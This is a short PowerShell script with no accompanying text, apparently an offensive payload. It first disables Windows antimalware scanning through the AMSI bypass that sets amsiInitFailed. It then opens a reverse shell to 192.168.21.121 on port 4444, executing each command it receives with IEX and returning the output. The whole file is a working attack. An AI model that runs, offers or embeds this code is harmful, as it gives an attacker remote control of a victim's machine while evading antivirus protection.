[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$h='System.Net.Sockets.TCPClient'
$c=New-Object ($h)('192.168.21.121',4444)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
 $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
 $r=(IEX $d 2>&1 | Out-String)
 $r2=$r + 'PS ' + (pwd).Path + '> '
 $out=([Text.Encoding]::ASCII).GetBytes($r2)
 $s.Write($out,0,$out.Length);$s.Flush()
}
$c.Close()
